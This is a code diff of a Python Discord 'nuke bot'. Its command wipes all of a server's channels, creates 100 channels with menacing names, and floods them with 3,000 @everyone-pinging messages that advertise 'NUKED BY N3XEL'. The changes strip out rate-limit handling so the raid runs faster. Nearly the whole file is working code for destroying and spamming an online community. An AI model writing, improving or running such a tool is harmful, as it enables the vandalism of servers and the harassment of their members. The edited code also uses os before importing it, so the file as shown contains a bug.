@@ -1,19 +1,19 @@
+
 import asyncio
 import discord
 from discord.ext import commands
 import random
 import time
-import os
 
 # --- CONFIGURE THESE ---
-BOT_TOKEN = os.getenv("TOKEN")
-if not BOT_TOKEN:
-    raise ValueError("No TOKEN found. Set TOKEN on Railway.")
-
+BOT_TOKEN = os.getenv("TOKEN")  # Use Railway env var (or hardcode)
 PREFIX = "."
 
-# Channel names (randomly chosen)
-CHANNEL_NAMES = [
+# Nuke Configuration
+CHANNEL_NAME = "nuked"  # fallback if random names disabled
+
+# Your fancy channel names list
+RANDOM_CHANNEL_NAMES = [
     "𝔫𝔦𝔤𝔥𝔱𝔪𝔞𝔯𝔢 𝔦𝔰 𝔥𝔢𝔯𝔢",
     "ɴɪɢʜᴛᴍᴀʀᴇ ɪs ʜᴇʀᴇ",
     "ⁿⁱᵍʰᵐᵃʳᵉ ⁱˢ ʰᵉʳᵉ",
@@ -24,22 +24,25 @@ CHANNEL_NAMES = [
     "dєstrσчєd",
     "n̶i̶g̶h̶t̶m̶a̶r̶e̶"
 ]
+USE_RANDOM_NAMES = True  # Set to False to always use CHANNEL_NAME
 
+# Message content
 MESSAGE = "# NUKED BY N3XEL\nhttps://discord.gg/qhuMKeShn\n||@everyone|| ||@here||"
-AMOUNT_OF_CHANNELS = 100
-MESSAGES_PER_CHANNEL = 30  # each channel gets exactly 30 messages
 
-# Concurrency (higher = faster, but Discord may rate limit)
-DELETE_CONCURRENCY = 30
-CREATE_CONCURRENCY = 20
-MESSAGE_CONCURRENCY = 100   # send 100 messages at once across all channels
+AMOUNT_OF_CHANNELS = 100
+MESSAGES_PER_CHANNEL = 30   # each channel gets this many
+# Total messages = AMOUNT_OF_CHANNELS * MESSAGES_PER_CHANNEL
+AMOUNT_OF_MESSAGES = AMOUNT_OF_CHANNELS * MESSAGES_PER_CHANNEL
 
 # -----------------------
-# DO NOT MODIFY BELOW
+# DO NOT MODIFY BEYOND THIS POINT UNLESS YOU KNOW WHAT YOU'RE DOING!
 # -----------------------
 
 def get_channel_name():
-    return random.choice(CHANNEL_NAMES)
+    """Get channel name (random or fixed)"""
+    if USE_RANDOM_NAMES and RANDOM_CHANNEL_NAMES:
+        return random.choice(RANDOM_CHANNEL_NAMES)
+    return CHANNEL_NAME
 
 intents = discord.Intents.default()
 intents.guilds = True
@@ -48,67 +51,54 @@ intents.message_content = True
 
 bot = commands.Bot(command_prefix=PREFIX, intents=intents)
 
-async def send_messages_parallel(channels, messages_per_channel):
-    """Send messages_per_channel to each channel, all at once, with high concurrency"""
+async def send_messages_fast(channels, message, total):
+    """Send messages with rate limiting using semaphore"""
     if not channels:
         return
-    total_messages = len(channels) * messages_per_channel
-    print(f"Sending {total_messages} messages ({messages_per_channel} per channel) in parallel...")
     
-    semaphore = asyncio.Semaphore(MESSAGE_CONCURRENCY)
+    semaphore = asyncio.Semaphore(50)
     
-    async def send_one(channel):
+    async def send_with_limit(channel, msg):
         async with semaphore:
             try:
-                await channel.send(MESSAGE)
-            except discord.HTTPException as e:
-                if e.status == 429:
-                    await asyncio.sleep(e.retry_after)
-                    await channel.send(MESSAGE)
+                await channel.send(msg)
             except Exception:
                 pass
     
-    # Create a list of tasks: for each channel, repeat messages_per_channel times
     tasks = []
-    for ch in channels:
-        for _ in range(messages_per_channel):
-            tasks.append(send_one(ch))
+    for i in range(total):
+        channel = channels[i % len(channels)]
+        tasks.append(send_with_limit(channel, message))
     
-    # Run them all concurrently
     await asyncio.gather(*tasks, return_exceptions=True)
-    print("All messages sent.")
 
 async def nuke_server(guild: discord.Guild):
+    """Main nuke logic - deletes all channels, creates new ones, and spams messages"""
     print(f"Starting nuke on {guild.name} ({guild.id})")
     start_time = time.perf_counter()
 
-    # Step 1: Delete all channels (batched)
+    # Step 1: Delete all channels
     print("Deleting all channels...")
-    channels_list = list(guild.channels)
-    for i in range(0, len(channels_list), DELETE_CONCURRENCY):
-        batch = channels_list[i:i+DELETE_CONCURRENCY]
-        await asyncio.gather(*(ch.delete() for ch in batch), return_exceptions=True)
-    print("All channels deleted.")
+    await asyncio.gather(
+        *(channel.delete() for channel in guild.channels),
+        return_exceptions=True
+    )
 
-    # Step 2: Create new channels (batched)
+    # Step 2: Create new channels
     print(f"Creating {AMOUNT_OF_CHANNELS} channels...")
-    created_channels = []
-    for i in range(0, AMOUNT_OF_CHANNELS, CREATE_CONCURRENCY):
-        batch_size = min(CREATE_CONCURRENCY, AMOUNT_OF_CHANNELS - i)
-        tasks = []
-        for _ in range(batch_size):
-            name = get_channel_name()
-            tasks.append(guild.create_text_channel(name))
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-        for r in results:
-            if isinstance(r, discord.TextChannel):
-                created_channels.append(r)
-        await asyncio.sleep(0.3)  # brief pause to avoid global rate limit
-    print(f"Created {len(created_channels)} channels.")
+    async def create_raid_channel():
+        return await guild.create_text_channel(get_channel_name())
+    
+    channels = await asyncio.gather(
+        *(create_raid_channel() for _ in range(AMOUNT_OF_CHANNELS)),
+        return_exceptions=True
+    )
 
-    # Step 3: Send messages in parallel across all channels
-    if created_channels:
-        await send_messages_parallel(created_channels, MESSAGES_PER_CHANNEL)
+    # Step 3: Send messages
+    text_channels = [c for c in channels if isinstance(c, discord.TextChannel)]
+    if text_channels:
+        print(f"Sending {AMOUNT_OF_MESSAGES} total messages ({MESSAGES_PER_CHANNEL} per channel)...")
+        await send_messages_fast(text_channels, MESSAGE, AMOUNT_OF_MESSAGES)
 
     elapsed = time.perf_counter() - start_time
     print(f"Nuke completed in {elapsed:.2f} seconds!")
@@ -122,6 +112,7 @@ async def on_ready():
 
 @bot.command(name="nuke")
 async def nuke(ctx):
+    """Nuke the current server"""
     if not ctx.author.guild_permissions.administrator:
         await ctx.send("❌ You need Administrator permission to use this command!")
         return
@@ -130,19 +121,24 @@ async def nuke(ctx):
 
 @bot.command(name="config")
 async def config(ctx):
+    """Show current configuration"""
     config_msg = f"""
 **Current Configuration:**
-📝 Channel Names: `{len(CHANNEL_NAMES)} variants`
+📝 Channel Names: `{len(RANDOM_CHANNEL_NAMES)} variants`
+🎲 Random Names: `{'Enabled' if USE_RANDOM_NAMES else 'Disabled'}`
 💬 Message: `{MESSAGE[:50]}...`
 📊 Channels: `{AMOUNT_OF_CHANNELS}`
 📨 Messages per Channel: `{MESSAGES_PER_CHANNEL}`
-⚡ Delete Concurrency: `{DELETE_CONCURRENCY}`
-⚡ Create Concurrency: `{CREATE_CONCURRENCY}`
-⚡ Message Concurrency: `{MESSAGE_CONCURRENCY}`
+📨 Total Messages: `{AMOUNT_OF_MESSAGES}`
     """
     await ctx.send(config_msg)
 
 if __name__ == "__main__":
-    print("Starting Nuke Bot (parallel messages)...")
+    import os
+    token = os.getenv("TOKEN", BOT_TOKEN)  # prefer env var, fallback to hardcoded
+    if token == "PUT YOUR BOT TOKEN HERE!" and not os.getenv("TOKEN"):
+        print("❌ Please set your TOKEN in environment variable or in the script.")
+        exit(1)
+    print("Starting Nuke Bot...")
     print("=" * 50)
-    bot.run(BOT_TOKEN) 
+    bot.run(token)
